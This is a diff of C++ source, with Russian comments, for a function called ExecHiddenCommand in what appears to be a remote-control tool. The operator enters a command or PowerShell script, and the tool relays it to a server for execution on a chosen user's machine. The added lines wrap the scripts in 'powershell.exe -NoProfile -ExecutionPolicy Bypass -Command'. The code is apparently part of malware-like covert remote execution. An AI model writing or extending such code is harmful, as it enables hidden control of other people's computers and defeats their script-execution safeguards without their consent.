@@ -277,24 +277,31 @@ void FileManager::ExecHiddenCommand()
     while (true)
     {
         cmd.clear();
-        cout << "cmd/script path(../path_example.ps1):";
+        cout << "cmd/script path(path_example.ps1):";
         getline(cin, cmd);
 
-        // Если передан скрипт, считываем содержимое и отправляем на сервер с меткой '#ps1'
+        // Если передан скрипт или програ, считываем содержимое и отправляем на сервер с меткой '#cmd'
         if (cmd.find(".ps1") != string::npos)
         {
             ifstream ps(cmd);
             cmd.clear();
-            while(!ps.eof())
+            while (!ps.eof())
             {
                 string tmp;
                 getline(ps, tmp);
                 cmd += tmp + "\n";
             }
-            cmd.insert(0, "#ps1");
+            std::string ps_command = "powershell.exe chcp 1251 -NoProfile -ExecutionPolicy Bypass -Command \"";
+            //ps_command += "$OutputEncoding = [System.Text.Encoding]::ANSI;\n";
+            ps_command += cmd + "\"";
+
+            cmd = ps_command;
+            cmd.insert(0, "#cmd");
         }
-        else
+        else if (cmd.find(".exe") != string::npos)
             cmd.insert(0, "#");
+        else
+            cmd.insert(0, "#cmd");
 
         cout << "Available users:" << endl;
         {
